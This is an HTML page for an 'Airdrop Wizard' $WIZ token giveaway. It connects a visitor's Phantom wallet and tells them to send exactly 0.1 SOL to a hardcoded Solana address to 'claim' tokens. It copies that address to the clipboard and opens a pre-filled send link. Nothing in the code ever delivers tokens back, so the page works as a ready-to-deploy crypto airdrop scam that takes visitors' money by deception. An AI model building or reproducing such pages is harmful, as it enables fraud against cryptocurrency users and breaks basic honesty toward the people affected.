<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>AIRDROP WIZARD • $WIZ</title>
  <script src="https://unpkg.com/@solana/web3.js@latest/dist/web3.min.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=VT323&display=swap');

    :root {
      --neon-pink: #ff00ff;
      --neon-cyan: #00ffff;
      --neon-green: #39ff14;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: linear-gradient(135deg, #0a0a1f 0%, #1a0033 100%);
      color: #00ffff;
      font-family: 'VT323', monospace;
      font-size: 24px;
      line-height: 1.5;
      min-height: 100vh;
      overflow-x: hidden;
      position: relative;
    }

    body::before {
      content: '';
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: repeating-linear-gradient(transparent 0px, transparent 3px, rgba(255,255,255,0.04) 3px, rgba(255,255,255,0.04) 6px);
      pointer-events: none;
      z-index: 1;
      animation: scan 5s linear infinite;
    }

    @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }

    .container {
      max-width: 100%;
      padding: 20px;
      position: relative;
      z-index: 2;
    }

    header {
      text-align: center;
      padding: 30px 0 20px;
    }

    .logo {
      font-family: 'Press Start 2P', cursive;
      font-size: 3.2rem;
      background: linear-gradient(90deg, #ff00ff, #00ffff, #39ff14);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 30px #ff00ff;
      animation: glitch 1.8s infinite alternate;
    }

    @keyframes glitch {
      0% { transform: translate(0); }
      20% { transform: translate(-2px, 2px); }
      40% { transform: translate(2px, -2px); }
      100% { transform: translate(0); }
    }

    .tagline {
      font-size: 1.8rem;
      color: var(--neon-green);
      margin: 10px 0 30px;
    }

    .card {
      background: rgba(10, 10, 31, 0.92);
      border: 4px solid var(--neon-cyan);
      box-shadow: 0 0 40px var(--neon-cyan);
      padding: 30px 25px;
      margin: 0 auto;
      max-width: 520px;
      border-radius: 8px;
    }

    h1 {
      font-size: 2.6rem;
      color: var(--neon-pink);
      text-align: center;
      margin-bottom: 20px;
      text-shadow: 0 0 20px var(--neon-pink);
    }

    .amount {
      font-size: 2.4rem;
      color: #ffff00;
      text-align: center;
      margin: 20px 0;
      text-shadow: 0 0 15px #ffff00;
    }

    .connect-btn, .send-btn {
      width: 100%;
      background: linear-gradient(45deg, #ff00ff, #00ffff);
      color: #000;
      font-family: 'Press Start 2P', cursive;
      font-size: 1.7rem;
      padding: 22px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin: 15px 0;
      box-shadow: 0 0 30px #ff00ff;
      text-transform: uppercase;
      letter-spacing: 3px;
    }

    .send-btn {
      background: linear-gradient(45deg, #39ff14, #00ffff);
      font-size: 1.9rem;
      padding: 26px;
    }

    .status {
      margin: 25px 0;
      font-size: 1.5rem;
      text-align: center;
      min-height: 80px;
    }

    .connected { color: #39ff14; }

    .address-box {
      background: #000;
      border: 3px dashed var(--neon-pink);
      padding: 18px;
      margin: 20px 0;
      font-size: 1.35rem;
      word-break: break-all;
      color: #00ffff;
      text-align: center;
    }

    .qr-container {
      text-align: center;
      margin: 25px 0;
    }

    footer {
      text-align: center;
      padding: 40px 10px 20px;
      color: #888;
      font-size: 1.3rem;
    }

    .scanline {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: linear-gradient(to bottom, transparent 50%, rgba(57,255,20,0.06) 50%);
      background-size: 100% 6px;
      pointer-events: none;
      z-index: 3;
      animation: scanline-move 7s linear infinite;
    }

    @keyframes scanline-move { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
  </style>
</head>
<body>
  <div class="scanline"></div>
  
  <div class="container">
    <header>
      <div class="logo">AIRDROP WIZARD</div>
      <div class="tagline">NEON REWARDS AWAIT</div>
    </header>

    <div class="card">
      <h1>SEND 0.1 SOL</h1>
      <div class="amount">0.1 SOL → $WIZ AIRDROP</div>
      <p style="text-align:center; font-size:1.6rem; margin-bottom:25px;">
        Connect Phantom then send exactly <strong>0.1 SOL</strong> to claim your tokens in the neon grid.
      </p>

      <button id="connectBtn" class="connect-btn">CONNECT PHANTOM WALLET</button>
      <button id="sendBtn" class="send-btn" style="display:none;">SEND 0.1 SOL NOW</button>

      <div id="status" class="status"></div>

      <div id="sendSection" style="display:none;">
        <div class="address-box" id="addressDisplay">MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn</div>
        
        <div class="qr-container">
          <img id="qrCode" src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn" 
               alt="QR Code" style="max-width:100%; border:3px solid #ff00ff; padding:8px; background:#000;">
        </div>

        <p style="text-align:center; font-size:1.4rem; color:#ffff00;">
          Scan QR with Phantom or copy address below
        </p>
      </div>
    </div>

    <footer>
      © 2026 Airdrop Wizard • $WIZ<br>
      Send exactly <strong>0.1 SOL</strong> only
    </footer>
  </div>

  <script>
    const connectBtn = document.getElementById('connectBtn');
    const sendBtn = document.getElementById('sendBtn');
    const statusDiv = document.getElementById('status');
    const sendSection = document.getElementById('sendSection');
    const RECIPIENT = "MuDxVcdRAA4dHzKbJsNeLzY5cTn8KMAA1Mz7428seHn";
    const AMOUNT = "0.1";

    async function connectPhantom() {
      if (!window.solana || !window.solana.isPhantom) {
        statusDiv.innerHTML = `<span style="color:#ff00ff;">Phantom not detected.<br>Install from phantom.app</span>`;
        return;
      }

      try {
        const resp = await window.solana.connect();
        const pubkey = resp.publicKey.toString();

        statusDiv.innerHTML = `
          <span class="connected">✅ CONNECTED SUCCESSFULLY</span><br>
          <small>${pubkey.slice(0,8)}...${pubkey.slice(-6)}</small>
        `;

        connectBtn.style.display = 'none';
        sendBtn.style.display = 'block';
        sendSection.style.display = 'block';

      } catch (err) {
        statusDiv.innerHTML = `<span style="color:#ff00ff;">Connection failed. Try again.</span>`;
      }
    }

    function copyAndPromptSend() {
      navigator.clipboard.writeText(RECIPIENT).then(() => {
        statusDiv.innerHTML += `<br><span style="color:#ffff00;">✅ Address copied to clipboard!</span><br>Now open Phantom → Send → Paste address → Enter <strong>0.1 SOL</strong>`;
        
        // Try deep link fallback (may not prefill amount reliably)
        const deepLink = `https://phantom.app/ul/v1/send?to=${RECIPIENT}&amount=${AMOUNT}&network=solana`;
        window.open(deepLink, '_blank');
      });
    }

    connectBtn.addEventListener('click', connectPhantom);
    sendBtn.addEventListener('click', copyAndPromptSend);

    // Initial detection
    window.addEventListener('load', () => {
      if (window.solana && window.solana.isPhantom) {
        statusDiv.innerHTML = `<span style="color:#39ff14;">Phantom ready ✓</span>`;
      }
    });
  </script>
</body>
</html>
